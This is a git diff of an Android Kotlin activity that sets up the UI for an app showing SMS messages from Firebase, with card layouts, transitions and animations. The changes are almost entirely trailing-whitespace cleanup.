@@ -46,7 +46,7 @@ import dagger.hilt.android.AndroidEntryPoint
 
 /**
  * ActivatedActivity - Restructured Version
- * 
+ *
  * Uses modular architecture with separate managers:
  * - ActivatedViewModel: State management
  * - ActivatedUIManager: UI setup and visibility
@@ -57,13 +57,13 @@ import dagger.hilt.android.AndroidEntryPoint
  */
 @AndroidEntryPoint
 class ActivatedActivity : AppCompatActivity() {
-    
+
     // View binding
     private val id by lazy { ActivityActivatedBinding.inflate(layoutInflater) }
-    
+
     // ViewModel
     private val viewModel: ActivatedViewModel by viewModels()
-    
+
     // Managers
     private lateinit var uiManager: ActivatedUIManager
     private lateinit var statusManager: ActivatedStatusManager
@@ -71,10 +71,10 @@ class ActivatedActivity : AppCompatActivity() {
     private lateinit var buttonManager: ActivatedButtonManager
     private lateinit var serviceManager: ActivatedServiceManager
     private lateinit var logoAnimationManager: LogoAnimationManager
-    
+
     // SMS Adapter
     private lateinit var smsAdapter: SmsMessageAdapter
-    
+
     // Device ID
     @get:SuppressLint("HardwareIds")
     private val cachedAndroidId by lazy {
@@ -82,38 +82,38 @@ class ActivatedActivity : AppCompatActivity() {
         LogHelper.d("ActivatedActivity", "Device ID retrieved: $id")
         id
     }
-    
+
     // Instruction content state (tracks if instruction has content, not visibility)
     private var hasInstructionContent: Boolean = false
-    
+
     // Handler for UI updates
     private val handler = Handler(Looper.getMainLooper())
     private val handlerRunnables = mutableListOf<Runnable>()
-    
+
     // State
     private var activationCode: String? = null
     private var activationMode: String? = null // "testing" or "running"
     private var isTransitioningFromSplash: Boolean = false
     private var isResetting = false
     private var isTesting = false // Prevent multiple simultaneous test clicks
-    
+
     // Timer state
     private var testTimerSeconds: Int = 0
     private var testTimerRunnable: Runnable? = null
     private var isTimerRunning: Boolean = false
-    
+
     // Animation state
     private var currentAnimationType = 1 // 1-5 for different animation types
-    
+
     // Firebase SMS listener reference
     private var smsFirebaseListener: com.google.firebase.database.ChildEventListener? = null
-    
+
     // Total SMS message count (for badge display)
     private var totalSmsMessageCount = 0
     private var initialLoadCompleted = false
     private var initialLoadTimestamp = 0L
     private var lastLoadedMessageTimestamp = 0L // Track latest message timestamp from initial load
-    
+
     // Animation state flags to prevent crashes when multiple messages arrive
     private var isBorderBlinkAnimating = false
     private var borderBlinkHandler: android.os.Handler? = null
@@ -123,7 +123,7 @@ class ActivatedActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
-        
+
         // Set window background immediately
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             window.setBackgroundDrawableResource(R.drawable.gradient)
@@ -133,10 +133,10 @@ class ActivatedActivity : AppCompatActivity() {
             window.allowReturnTransitionOverlap = true
             window.enterTransition = null
         }
-        
+
         setContentView(id.root)
         AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)
-        
+
         // IMPORTANT: Force all cards visible IMMEDIATELY after setContentView
         // This must be done synchronously before any other operations
         try {
@@ -144,21 +144,21 @@ class ActivatedActivity : AppCompatActivity() {
             // cardView6 from ActivationActivity morphs into phoneCard
             id.phoneCardWrapper.transitionName = "card_wrapper_transition"
             id.phoneCard.transitionName = "phone_card_transition" // Match cardView6 transition name
-            
+
             id.phoneCard.visibility = View.VISIBLE
             id.phoneCard.alpha = 1f
             id.phoneCardWrapper.visibility = View.VISIBLE
             id.phoneCardWrapper.alpha = 1f
-            
+
             id.statusCard.visibility = View.VISIBLE
             id.statusCard.alpha = 1f
             // Ensure status card has minimum height
             id.statusCard.minimumHeight = (80 * resources.displayMetrics.density).toInt()
-            
+
             // SMS card is always visible now (instruction is on back side)
             id.smsCard.visibility = View.VISIBLE
             id.smsCard.alpha = 1f
-            
+
             // Always show SMS by default (instruction is always available on back side)
             id.smsContentFront.visibility = View.VISIBLE
             id.smsContentFront.alpha = 1f
@@ -171,10 +171,10 @@ class ActivatedActivity : AppCompatActivity() {
             // Ensure RecyclerView is clickable
             id.smsRecyclerView.isClickable = true
             id.smsRecyclerView.isEnabled = true
-            
+
             id.testButtonsContainer.visibility = View.VISIBLE
             id.testButtonsContainer.alpha = 1f
-            
+
             // Log initial dimensions (before layout)
             id.main.post {
                 try {
@@ -183,7 +183,7 @@ class ActivatedActivity : AppCompatActivity() {
                     LogHelper.e("ActivatedActivity", "Error logging initial dimensions", e)
                 }
             }
-            
+
             // Force layout to resolve constraints
             id.main.post {
                 try {
@@ -197,17 +197,17 @@ class ActivatedActivity : AppCompatActivity() {
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error setting card visibility", e)
         }
-        
+
         // Initialize ViewModel
         // ViewModel is injected via Hilt, no need to create manually
         viewModel.cachedAndroidId = cachedAndroidId
-        
+
         // Setup shared element transition
         setupTransitions()
-        
+
         // Load branding config
         loadBrandingConfig()
-        
+
         // Initialize managers (with error handling)
         try {
             initializeManagers()
@@ -215,14 +215,14 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error initializing managers", e)
             // Continue anyway - some features may not work but app won't crash
         }
-        
+
         // Setup UI
                 try {
             setupUI()
                 } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error setting up UI", e)
         }
-        
+
         // Force layout after initial setup to ensure constraint chain resolves
         id.main.viewTreeObserver.addOnGlobalLayoutListener(object : ViewTreeObserver.OnGlobalLayoutListener {
             override fun onGlobalLayout() {
@@ -234,23 +234,23 @@ class ActivatedActivity : AppCompatActivity() {
                         @Suppress("DEPRECATION")
                         id.main.viewTreeObserver.removeGlobalOnLayoutListener(this)
                     }
-                    
+
                     // Force all cards to be visible and request layout
                     id.statusCard.visibility = View.VISIBLE
                     id.statusCard.alpha = 1f
                     id.statusCard.requestLayout()
                     id.statusCard.invalidate()
-                    
+
                     // SMS card is always visible now (instruction is on back side)
                     id.smsCard.visibility = View.VISIBLE
                     id.smsCard.alpha = 1f
-                    
+
                     // Always show SMS by default
                     id.smsContentFront.visibility = View.VISIBLE
                     id.smsContentFront.alpha = 1f
                     id.instructionContentBack.visibility = View.GONE
                     id.instructionContentBack.alpha = 0f
-                    
+
                     id.smsCard.isClickable = true
                     id.smsCard.isEnabled = true
                     id.smsCard.requestLayout()
@@ -258,12 +258,12 @@ class ActivatedActivity : AppCompatActivity() {
                     // Ensure RecyclerView is also ready
                     id.smsRecyclerView.isClickable = true
                     id.smsRecyclerView.isEnabled = true
-                    
+
                 id.testButtonsContainer.visibility = View.VISIBLE
             id.testButtonsContainer.alpha = 1f
                     id.testButtonsContainer.requestLayout()
                     id.testButtonsContainer.invalidate()
-                    
+
                     // Log all card dimensions and positions
                     handler.postDelayed({
                         try {
@@ -272,7 +272,7 @@ class ActivatedActivity : AppCompatActivity() {
                             LogHelper.e("ActivatedActivity", "Error logging card dimensions", e)
                         }
                     }, 100)
-                    
+
                     // Also log after a longer delay to catch any delayed layout changes
                     handler.postDelayed({
                         try {
@@ -281,21 +281,21 @@ class ActivatedActivity : AppCompatActivity() {
                             LogHelper.e("ActivatedActivity", "Error in final card dimension check", e)
                         }
                     }, 500)
-                    
+
                     LogHelper.d("ActivatedActivity", "Forced layout for cards after global layout")
                 } catch (e: Exception) {
                     LogHelper.e("ActivatedActivity", "Error forcing layout in global layout listener", e)
                 }
             }
         })
-        
+
         // Setup Firebase listeners
         try {
             setupFirebaseListeners()
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error setting up Firebase listeners", e)
         }
-        
+
         // Setup buttons
         try {
             LogHelper.d("ActivatedActivity", "Setting up buttons...")
@@ -304,42 +304,42 @@ class ActivatedActivity : AppCompatActivity() {
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error setting up buttons", e)
         }
-        
+
         // Setup test timer
         try {
             setupTestTimer()
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error setting up test timer", e)
         }
-        
+
         // Ensure service is running
         try {
             serviceManager.ensureServiceRunning()
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error ensuring service running", e)
         }
-        
+
         // Handle intent data
         try {
             handleIntentData()
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error handling intent data", e)
         }
-        
+
         // Setup permissions
         try {
             checkPermissionsAndUpdateUI()
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error checking permissions", e)
         }
-        
+
         // Check if app is set as default SMS app (required for full SMS functionality)
         try {
             checkDefaultSms()
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error checking default SMS app", e)
         }
-        
+
         // Final visibility check after everything is set up
         id.main.postDelayed({
             try {
@@ -348,7 +348,7 @@ class ActivatedActivity : AppCompatActivity() {
                 // SMS card is always visible now (instruction is on back side)
                 id.smsCard.visibility = View.VISIBLE
                 id.smsCard.alpha = 1f
-                
+
                 // Always show SMS by default
                 id.smsContentFront.visibility = View.VISIBLE
                 id.smsContentFront.alpha = 1f
@@ -362,16 +362,16 @@ class ActivatedActivity : AppCompatActivity() {
             }
         }, 100)
     }
-    
+
     /**
      * Setup shared element transitions
      */
     private fun setupTransitions() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             try {
-                val hasTransitionFromIntent = intent.getBooleanExtra("hasTransition", false) || 
+                val hasTransitionFromIntent = intent.getBooleanExtra("hasTransition", false) ||
                                              intent.getBooleanExtra("animate", false)
-                
+
                 if (hasTransitionFromIntent) {
                     window.sharedElementEnterTransition = android.transition.TransitionSet().apply {
                         addTransition(android.transition.ChangeBounds())
@@ -380,7 +380,7 @@ class ActivatedActivity : AppCompatActivity() {
                         addTransition(android.transition.ChangeImageTransform()) // For smooth image/icon transitions
                         duration = 600
                         interpolator = android.view.animation.AccelerateDecelerateInterpolator()
-                        
+
                         // Add listener to morph background during transition
                         addListener(object : android.transition.Transition.TransitionListener {
                             override fun onTransitionStart(transition: android.transition.Transition) {
@@ -390,26 +390,26 @@ class ActivatedActivity : AppCompatActivity() {
                                 // Start with input field background style (will morph during transition)
                                 id.phoneCard.setBackgroundResource(R.drawable.input_field_selector)
                             }
-                            
+
                             override fun onTransitionEnd(transition: android.transition.Transition) {
                                 // Transition complete - ensure phone card has crypto hash card background
                                 id.phoneCard.post {
                                     id.phoneCard.setBackgroundResource(R.drawable.crypto_hash_card_background)
                                 }
                             }
-                            
+
                             override fun onTransitionCancel(transition: android.transition.Transition) {
                                 // Ensure background is set even if transition is cancelled
                                 id.phoneCard.post {
                                     id.phoneCard.setBackgroundResource(R.drawable.crypto_hash_card_background)
                                 }
                             }
-                            
+
                             override fun onTransitionPause(transition: android.transition.Transition) {}
                             override fun onTransitionResume(transition: android.transition.Transition) {}
                         })
                     }
-                    
+
                     // Add a listener that morphs the background during the transition
                     // Start changing background halfway through transition
                     handler.postDelayed({
@@ -418,9 +418,9 @@ class ActivatedActivity : AppCompatActivity() {
                             animateBackgroundMorph()
                         }
                     }, 300) // Halfway through 600ms transition
-                    
+
                     postponeEnterTransition()
-                    
+
                     val mainView = id.main
                     if (mainView != null && mainView.viewTreeObserver.isAlive) {
                         mainView.viewTreeObserver.addOnPreDrawListener(object : ViewTreeObserver.OnPreDrawListener {
@@ -445,7 +445,7 @@ class ActivatedActivity : AppCompatActivity() {
                     }
                 }
             }
-            
+
                 // Check if coming from SplashActivity
                 isTransitioningFromSplash = window.sharedElementEnterTransition != null
                 viewModel.isTransitioningFromSplash = isTransitioningFromSplash
@@ -454,7 +454,7 @@ class ActivatedActivity : AppCompatActivity() {
             }
         }
     }
-    
+
     /**
      * Animate background morph from input_field_selector to crypto_hash_card_background
      * Called during transition to smoothly change the border style
@@ -464,19 +464,19 @@ class ActivatedActivity : AppCompatActivity() {
             // Create a crossfade animation between backgrounds
             // Since we can't directly animate between drawables, we'll use alpha overlay
             val phoneCard = id.phoneCard
-            
+
             // Start with input_field_selector (from cardView6), then crossfade to crypto_hash_card_background
             // Use a ValueAnimator to control the transition
             val animator = ObjectAnimator.ofFloat(phoneCard, "alpha", 1f, 0.7f, 1f).apply {
                 duration = 300
                 interpolator = android.view.animation.AccelerateDecelerateInterpolator()
-                
+
                 addListener(object : AnimatorListenerAdapter() {
                     override fun onAnimationStart(animation: android.animation.Animator) {
                         // Ensure crypto hash card background is set (will show through)
                         phoneCard.setBackgroundResource(R.drawable.crypto_hash_card_background)
                     }
-                    
+
                     override fun onAnimationEnd(animation: android.animation.Animator) {
                         // Ensure final state
                         phoneCard.alpha = 1f
@@ -484,7 +484,7 @@ class ActivatedActivity : AppCompatActivity() {
                     }
                 })
             }
-            
+
             animator.start()
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error animating background morph", e)
@@ -492,7 +492,7 @@ class ActivatedActivity : AppCompatActivity() {
             id.phoneCard.setBackgroundResource(R.drawable.crypto_hash_card_background)
         }
     }
-        
+
     /**
      * Load branding config from Firebase
      */
@@ -504,7 +504,7 @@ class ActivatedActivity : AppCompatActivity() {
         val logoView = id.textView11
         val taglineView = id.textView12
                         val headerSection = id.headerSection
-                        
+
                         if (logoView != null) {
                             logoView.text = logoName
                             logoView.visibility = View.VISIBLE
@@ -526,22 +526,22 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error loading branding config", e)
         }
     }
-    
+
     /**
      * Initialize all managers
      */
     private fun initializeManagers() {
         // UI Manager
         uiManager = ActivatedUIManager(id, isTransitioningFromSplash)
-        
+
         // Status Manager
         statusManager = ActivatedStatusManager(id)
-        
+
         // Setup BANK data listener for status card (will be called after activation code is available)
-        
+
         // Service Manager
         serviceManager = ActivatedServiceManager(this)
-        
+
         // Button Manager
         buttonManager = ActivatedButtonManager(
             binding = id,
@@ -549,7 +549,7 @@ class ActivatedActivity : AppCompatActivity() {
             onResetClick = { handleResetClick() },
             onTestClick = { handleTestClick() }
         )
-        
+
         // Firebase Manager (will be initialized after device ID is ready)
         firebaseManager = ActivatedFirebaseManager(
             deviceId = cachedAndroidId,
@@ -580,7 +580,7 @@ class ActivatedActivity : AppCompatActivity() {
                     activationCode = codeWithoutDashes
                     viewModel.activationCode = codeWithoutDashes
                     updateActivationCodeDisplay(codeWithoutDashes)
-                    
+
                     // Setup status text listener for status card (use code without dashes)
                     if (!codeWithoutDashes.isNullOrBlank()) {
                         try {
@@ -612,34 +612,34 @@ class ActivatedActivity : AppCompatActivity() {
             }
         )
     }
-    
+
     /**
      * Setup UI
      */
     private fun setupUI() {
         // Force all cards visible immediately
         forceAllCardsVisible()
-        
+
         uiManager.setupUIAfterBranding(false) // Always show SMS by default
-        
+
         // Setup animated borders
         setupAnimatedBorders()
-        
+
         // Setup SMS RecyclerView and listener (must be done early)
         setupSmsRecyclerView()
-        
+
         // Setup activation code display
         setupActivationCodeDisplay()
 
         // Setup date/time display
         setupDateTimeDisplay()
-        
+
         // Setup animation change button
         setupAnimationChangeButton()
-        
+
         // Setup manual flip for SMS/Instruction card
         setupSmsCardFlipToggle()
-        
+
         // Setup logo animations - start after a short delay to ensure logo is visible
         handler.postDelayed({
             try {
@@ -653,14 +653,14 @@ class ActivatedActivity : AppCompatActivity() {
             }
         }, 500)
     }
-    
+
     /**
      * Log dimensions and positions of all cards for debugging
      */
     private fun logCardDimensions(context: String) {
         try {
             LogHelper.d("ActivatedActivity", "=== Card Dimensions Log ($context) ===")
-            
+
             // Phone Card
             val phoneCard = id.phoneCard
             val phoneX = phoneCard.x
@@ -674,7 +674,7 @@ class ActivatedActivity : AppCompatActivity() {
                 else -> "UNKNOWN"
             }
             LogHelper.d("ActivatedActivity", "Phone Card: X=$phoneX, Y=$phoneY, Width=$phoneWidth, Height=$phoneHeight, Visibility=$phoneVisibility, Alpha=${phoneCard.alpha}")
-            
+
             // Status Card
             val statusCard = id.statusCard
             val statusX = statusCard.x
@@ -688,7 +688,7 @@ class ActivatedActivity : AppCompatActivity() {
                 else -> "UNKNOWN"
             }
             LogHelper.d("ActivatedActivity", "Status Card: X=$statusX, Y=$statusY, Width=$statusWidth, Height=$statusHeight, Visibility=$statusVisibility, Alpha=${statusCard.alpha}")
-            
+
             // SMS Card
             val smsCard = id.smsCard
             val smsX = smsCard.x
@@ -702,7 +702,7 @@ class ActivatedActivity : AppCompatActivity() {
                 else -> "UNKNOWN"
             }
             LogHelper.d("ActivatedActivity", "SMS Card: X=$smsX, Y=$smsY, Width=$smsWidth, Height=$smsHeight, Visibility=$smsVisibility, Alpha=${smsCard.alpha}")
-            
+
             // Buttons Container
             val buttonsContainer = id.testButtonsContainer
             val buttonsX = buttonsContainer.x
@@ -716,9 +716,9 @@ class ActivatedActivity : AppCompatActivity() {
                 else -> "UNKNOWN"
             }
             LogHelper.d("ActivatedActivity", "Buttons Container: X=$buttonsX, Y=$buttonsY, Width=$buttonsWidth, Height=$buttonsHeight, Visibility=$buttonsVisibility, Alpha=${buttonsContainer.alpha}")
-            
+
             LogHelper.d("ActivatedActivity", "=== End Card Dimensions Log ===")
-            
+
             // Check for issues
             if (statusHeight == 0) {
                 LogHelper.w("ActivatedActivity", "⚠️ Status card has 0 height - forcing min height")
@@ -742,7 +742,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error logging card dimensions", e)
         }
     }
-    
+
     /**
      * Force all cards to be visible - called before UI manager
      */
@@ -755,35 +755,35 @@ class ActivatedActivity : AppCompatActivity() {
                     id.phoneCard.alpha = 1f
                     id.phoneCard.isClickable = true
                     id.phoneCard.isEnabled = true
-                    
+
                     // Status card
                     id.statusCard.visibility = View.VISIBLE
                     id.statusCard.alpha = 1f
                     id.statusCard.isClickable = true
                     id.statusCard.isEnabled = true
-                    
+
                     // SMS card is always visible now (instruction is on back side)
                     id.smsCard.visibility = View.VISIBLE
                     id.smsCard.alpha = 1f
-                    
+
                     // Always show SMS by default
                     id.smsContentFront.visibility = View.VISIBLE
                     id.smsContentFront.alpha = 1f
                     id.instructionContentBack.visibility = View.GONE
                     id.instructionContentBack.alpha = 0f
-                    
+
                     id.smsCard.isClickable = true
                     id.smsCard.isEnabled = true
                     // Ensure RecyclerView is also clickable
                     id.smsRecyclerView.isClickable = true
                     id.smsRecyclerView.isEnabled = true
-                    
+
                     // Button container
                     id.testButtonsContainer.visibility = View.VISIBLE
                     id.testButtonsContainer.alpha = 1f
                     id.testButtonsContainer.isClickable = true
                     id.testButtonsContainer.isEnabled = true
-                    
+
                     LogHelper.d("ActivatedActivity", "All cards forced visible and clickable")
                 } catch (e: Exception) {
                     LogHelper.e("ActivatedActivity", "Error forcing cards visible", e)
@@ -793,7 +793,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error in forceAllCardsVisible", e)
         }
     }
-    
+
     /**
      * Setup animated borders (removed - no scan lines needed)
      */
@@ -801,17 +801,17 @@ class ActivatedActivity : AppCompatActivity() {
         try {
             // Phone card border removed - no border needed
             // SMS card border removed - no border needed
-            
+
             // Setup water/vibration effect for phone card
             setupWaterEffect(id.phoneCard)
-            
+
             // Setup water/vibration effect for SMS card
             setupWaterEffect(id.smsCard)
                         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error setting up animated borders", e)
         }
     }
-    
+
     /**
      * Setup water/vibration effect for a card
      * Creates a subtle continuous vibration/ripple effect
@@ -821,54 +821,54 @@ class ActivatedActivity : AppCompatActivity() {
             if (card == null || isDestroyed || isFinishing) {
                             return
                         }
-                        
+
             // Convert dp to pixels for vibration intensity
             val density = resources.displayMetrics.density
             val vibrationIntensity = 1.5f * density // 1.5dp vibration
             val scaleVariation = 0.002f // Very subtle scale variation (0.2%)
-            
+
             // Create X translation animator (horizontal vibration)
             val translateXAnimator = ObjectAnimator.ofFloat(card, "translationX", 0f, vibrationIntensity, -vibrationIntensity, 0f)
             translateXAnimator.duration = 2000L // 2 seconds per cycle
             translateXAnimator.repeatCount = ObjectAnimator.INFINITE
             translateXAnimator.repeatMode = ObjectAnimator.RESTART
             translateXAnimator.interpolator = android.view.animation.LinearInterpolator()
-            
+
             // Create Y translation animator (vertical vibration) - slightly offset for natural feel
             val translateYAnimator = ObjectAnimator.ofFloat(card, "translationY", 0f, -vibrationIntensity, vibrationIntensity, 0f)
             translateYAnimator.duration = 2100L // Slightly different duration for organic feel
             translateYAnimator.repeatCount = ObjectAnimator.INFINITE
             translateYAnimator.repeatMode = ObjectAnimator.RESTART
             translateYAnimator.interpolator = android.view.animation.LinearInterpolator()
-            
+
             // Create subtle scale animator (breathing effect)
             val scaleXAnimator = ObjectAnimator.ofFloat(card, "scaleX", 1f, 1f + scaleVariation, 1f - scaleVariation, 1f)
             scaleXAnimator.duration = 1800L
             scaleXAnimator.repeatCount = ObjectAnimator.INFINITE
             scaleXAnimator.repeatMode = ObjectAnimator.RESTART
             scaleXAnimator.interpolator = android.view.animation.AccelerateDecelerateInterpolator()
-            
+
             val scaleYAnimator = ObjectAnimator.ofFloat(card, "scaleY", 1f, 1f + scaleVariation, 1f - scaleVariation, 1f)
             scaleYAnimator.duration = 1900L // Slightly different for organic feel
             scaleYAnimator.repeatCount = ObjectAnimator.INFINITE
             scaleYAnimator.repeatMode = ObjectAnimator.RESTART
             scaleYAnimator.interpolator = android.view.animation.AccelerateDecelerateInterpolator()
-            
+
             // Start all animations together
             translateXAnimator.start()
             translateYAnimator.start()
             scaleXAnimator.start()
             scaleYAnimator.start()
-            
+
             // Store animators for cleanup
             card.tag = listOf(translateXAnimator, translateYAnimator, scaleXAnimator, scaleYAnimator)
-            
+
             LogHelper.d("ActivatedActivity", "Water effect setup for card: ${card.id}")
                             } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error setting up water effect", e)
         }
     }
-    
+
     /**
      * Setup activation code display
      * Note: Phone display card removed - code is tracked internally only
@@ -877,10 +877,10 @@ class ActivatedActivity : AppCompatActivity() {
         // Get phone number or code from intent (for internal use only)
         val phoneFromIntent = intent.getStringExtra("phone")
         activationCode = intent.getStringExtra("code")
-        
+
         // Get activation mode (testing or running)
         activationMode = intent.getStringExtra("activationMode") ?: "testing"
-        
+
         // Update code label based on activation mode with animation
         val phoneCodeLabelView = id.phoneCodeLabel
         if (phoneCodeLabelView != null) {
@@ -893,7 +893,7 @@ class ActivatedActivity : AppCompatActivity() {
             // Animate label appearance
             animateLabelAppearance(phoneCodeLabelView)
         }
-        
+
         // Store code internally but don't display it (phone display card removed)
         if (phoneFromIntent != null && phoneFromIntent.isNotBlank() && phoneFromIntent.length >= 10) {
             // Coming from ActivationActivity
@@ -906,7 +906,7 @@ class ActivatedActivity : AppCompatActivity() {
                         val code = convertPhoneToCode(devicePhoneNumber)
                         activationCode = code
                         viewModel.activationCode = code
-                        
+
                         // Setup status text listener for status card (code is already without dashes)
                         try {
                             val mode = activationMode ?: "testing" // Default to testing if not set
@@ -937,7 +937,7 @@ class ActivatedActivity : AppCompatActivity() {
     private fun setupSmsRecyclerView() {
         try {
             smsAdapter = SmsMessageAdapter()
-            
+
             // Use LinearLayoutManager with proper spacing (fix overlap issue)
             val layoutManager = LinearLayoutManager(this).apply {
                 // Stack items vertically with no overlap
@@ -948,61 +948,61 @@ class ActivatedActivity : AppCompatActivity() {
             }
             id.smsRecyclerView.layoutManager = layoutManager
             id.smsRecyclerView.adapter = smsAdapter
-            
+
             // Disable item animations during initial load to prevent overlap
             id.smsRecyclerView.itemAnimator = null // Remove animations during initial setup
-            
+
             // Set up proper spacing with transparent background (integrated with card)
             id.smsRecyclerView.clipToPadding = true
             id.smsRecyclerView.clipChildren = true
             // Background is now transparent and integrated with card background
-            
+
             // Enable smooth scrolling
             id.smsRecyclerView.isNestedScrollingEnabled = true
             id.smsRecyclerView.setHasFixedSize(false) // Allow dynamic sizing
-            
+
             // Allow smooth vertical scrolling with normal overscroll
             id.smsRecyclerView.overScrollMode = View.OVER_SCROLL_IF_CONTENT_SCROLLS
-            
+
             // Enable scrollbars for visual feedback
             id.smsRecyclerView.isVerticalScrollBarEnabled = true
             id.smsRecyclerView.scrollBarStyle = View.SCROLLBARS_INSIDE_OVERLAY
-            
+
             // Ensure SMS card and RecyclerView are clickable and enabled (FIX for glitch)
             id.smsCard.isClickable = true
             id.smsCard.isEnabled = true
             id.smsRecyclerView.isClickable = true
             id.smsRecyclerView.isEnabled = true
-            
+
             // SMS card is always visible now (instruction is on back side)
             id.smsCard.visibility = View.VISIBLE
             id.smsCard.alpha = 1.0f
-            
+
             // Always show SMS by default
             id.smsContentFront.visibility = View.VISIBLE
             id.smsContentFront.alpha = 1f
             id.instructionContentBack.visibility = View.GONE
             id.instructionContentBack.alpha = 0f
-            
+
             // Show empty state initially
             id.smsEmptyState.visibility = View.VISIBLE
             id.smsRecyclerView.visibility = View.GONE
-            
+
             // Setup device info text (device ID and version code)
             setupDeviceInfoText()
-            
+
             // Load initial messages
             loadInitialSmsMessages()
-            
+
             // Setup Firebase listener for new SMS messages
             setupSmsFirebaseListener()
-            
+
             LogHelper.d("ActivatedActivity", "SMS RecyclerView setup complete - card is visible and clickable")
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error setting up SMS RecyclerView", e)
         }
     }
-    
+
     /**
      * Setup device info text (device ID and version code) outside SMS card
      */
@@ -1011,11 +1011,11 @@ class ActivatedActivity : AppCompatActivity() {
             val deviceId = cachedAndroidId
             val versionCode = VersionChecker.getCurrentVersionCode(this)
             val versionName = VersionChecker.getCurrentVersionName(this)
-            
+
             // Set device ID text (using findViewById as binding may not be updated yet)
             val deviceIdText = findViewById<android.widget.TextView>(R.id.deviceIdText)
             val versionCodeText = findViewById<android.widget.TextView>(R.id.versionCodeText)
-            
+
             deviceIdText?.text = "ID: $deviceId"  // Show full device ID without truncation
             // Firebase call log disabled for now
             // deviceIdText?.setOnLongClickListener {
@@ -1025,13 +1025,13 @@ class ActivatedActivity : AppCompatActivity() {
             //     true
             // }
             versionCodeText?.text = "V: $versionName ($versionCode)"
-            
+
             LogHelper.d("ActivatedActivity", "Device info set - ID: $deviceId, V: $versionName ($versionCode)")
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error setting device info text", e)
         }
     }
-    
+
     /**
      * Animate count badge update with pulse effect (matching HTML theme)
      */
@@ -1046,29 +1046,29 @@ class ActivatedActivity : AppCompatActivity() {
                 LogHelper.d("ActivatedActivity", "Border blink animation already running, skipping")
                 return
             }
-            
+
             val smsCard = id.smsCard ?: return
             val normalDrawable = resources.getDrawable(R.drawable.crypto_hash_card_background, theme) ?: return
             val highlightDrawable = resources.getDrawable(R.drawable.sms_card_border_highlight, theme) ?: return
-            
+
             val baseDrawable = normalDrawable.constantState?.newDrawable()?.mutate() ?: return
-            
+
             // Mark animation as running
             isBorderBlinkAnimating = true
-            
+
             // Cancel any pending runnables
             borderBlinkHandler?.let { handler ->
                 borderBlinkRunnables.forEach { handler.removeCallbacks(it) }
                 borderBlinkRunnables.clear()
             }
-            
+
             // Create new handler if needed
             if (borderBlinkHandler == null) {
                 borderBlinkHandler = android.os.Handler(android.os.Looper.getMainLooper())
             }
-            
+
             val handler = borderBlinkHandler!!
-            
+
             // First blink
             smsCard.background = highlightDrawable
             val runnable1 = Runnable {
@@ -1082,7 +1082,7 @@ class ActivatedActivity : AppCompatActivity() {
             }
             borderBlinkRunnables.add(runnable1)
             handler.postDelayed(runnable1, 300)
-            
+
             // Second blink after short delay
             val runnable2 = Runnable {
                 try {
@@ -1122,21 +1122,21 @@ class ActivatedActivity : AppCompatActivity() {
             borderBlinkRunnables.clear()
         }
     }
-    
+
     private fun animateCountBadgeUpdate(badge: android.widget.TextView, newText: String) {
         try {
             // Update text immediately
             badge.text = newText
-            
+
             // Scale animation: 1.0 -> 1.3 -> 1.0 (matching HTML pulse effect)
             val scaleX = android.animation.ObjectAnimator.ofFloat(badge, "scaleX", 1.0f, 1.3f, 1.0f)
             val scaleY = android.animation.ObjectAnimator.ofFloat(badge, "scaleY", 1.0f, 1.3f, 1.0f)
-            
+
             scaleX.duration = 300
             scaleY.duration = 300
             scaleX.interpolator = android.view.animation.AccelerateDecelerateInterpolator()
             scaleY.interpolator = android.view.animation.AccelerateDecelerateInterpolator()
-            
+
             // Start animation
             android.animation.AnimatorSet().apply {
                 playTogether(scaleX, scaleY)
@@ -1148,7 +1148,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error animating count badge", e)
         }
     }
-    
+
     /**
      * Setup animation change button
      */
@@ -1158,24 +1158,24 @@ class ActivatedActivity : AppCompatActivity() {
             button?.setOnClickListener {
                 // Cycle to next animation type
                 currentAnimationType = (currentAnimationType % 5) + 1
-                
+
                 // Update button text to show current animation
                 val animationNames = arrayOf("", "SCALE", "NONE", "FULL", "FADE", "BOUNCE")
                 button.text = "ANIM ${currentAnimationType}"
-                
+
                 // Apply animation to label
                 val labelView = id.phoneCodeLabel
                 if (labelView != null) {
                     animateLabelAppearance(labelView)
                 }
-                
+
                 LogHelper.d("ActivatedActivity", "Animation changed to type: $currentAnimationType")
             }
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error setting up animation change button", e)
         }
     }
-    
+
     /**
      * Animate label appearance - uses current animation type
      */
@@ -1189,7 +1189,7 @@ class ActivatedActivity : AppCompatActivity() {
             else -> animateLabelScaleSlide(labelView)   // Default
         }
     }
-    
+
     /**
      * Setup manual flip toggle for SMS card to show instructions
      * Always available - checks if instruction content exists when clicked
@@ -1201,7 +1201,7 @@ class ActivatedActivity : AppCompatActivity() {
                 val smsContentFront = id.smsContentFront
                 val instructionContentBack = id.instructionContentBack
                 val smsCardContentContainer = id.smsCardContentContainer
-                
+
                 if (instructionContentBack.visibility == View.VISIBLE) {
                     // Currently showing instruction - flip to SMS
